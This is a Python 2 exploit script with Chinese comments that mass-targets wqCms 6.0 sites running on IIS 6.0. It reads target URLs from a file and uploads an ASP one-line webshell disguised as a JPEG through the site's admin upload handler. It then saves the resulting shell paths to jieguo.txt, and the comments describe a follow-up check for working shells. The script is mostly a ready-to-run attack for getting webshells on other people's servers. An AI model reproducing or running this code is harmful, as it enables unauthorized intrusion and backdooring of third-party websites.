#批量检测wqcms6.0配合iis6.0解析漏洞getshell，根据网上的poc用burpsuit抓包，再用python重构了包，
#然后批量利用getshell，先用wqCms 6.0.py，检测网上批量抓的url.txt,之后会导出一个文本jieguo.txt,
#因为这个需要iis6.0的解析漏洞配合，所以就算上传成功了，也不一定可以利用，之后我们再来用结果检测.py来检测一下，
#jieguo.txt,中的连接，因为可以使用的shell一句话，会返回500错误，我们就把这些返回500的url写入shell.txt.就得到最后的答案了。
#evilwebshell coding
import urllib2,os,time
jieguo=[]
def saveListToFile(file,list):
    """
        
    :return:
    """
    s = '\n'.join(list)
    with open(file,'a') as output:
        output.write(s)
def exp():
    #buld post body data
    boundary = '----------%s' % (int(time.time() * 1000))
    data = []
    data.append('--%s' % boundary)       
    data.append('Content-Disposition: form-data; name="uploadify";'+' '+'filename="conn1.jpg"\r\n')
    data.append('Content-Type: image/jpeg\r\n')
    data.append('<%execute(request("1"))%>')
    data.append('--%s' % boundary)
        
    data.append('Content-Disposition: form-data; name="saveFile"\r\n')
    data.append('/1212.asp')
    data.append('--%s' % boundary)
    data.append('Content-Disposition: form-data; name="Upload"\r\n')
    data.append('Content-Disposition: form-data; name="Upload"\r\n')
    data.append('Submit Query')
    data.append('--%s' % boundary)
    http_body='\r\n'.join(data)

    #print http_body
    #open url list
    fp=open("url.txt", "r")
    alllines=fp.readlines()
    fp.close()
    for eachline in alllines:
        eachline=eachline.strip('\n')
        eachline=eachline.strip(' ')
        http_url=eachline+'admin_UploadDataHandler.ashx'
        print http_url
        try:
            req=urllib2.Request(http_url, data=http_body)
            req.add_header('Content-Type', 'multipart/form-data; boundary=%s' % boundary)
            req.add_header('User-Agent','Mozilla/5.0')
            resp = urllib2.urlopen(req, timeout=10)
            qrcont=resp.read()
            a=eval(qrcont)
            a1=eachline+a["src"]
            print a1
            jieguo.append(a1)
    
    
        except Exception,e:
            print 'http error'

def main():
    exp()
    saveListToFile('jieguo.txt',jieguo)


if __name__ == '__main__':
    main()
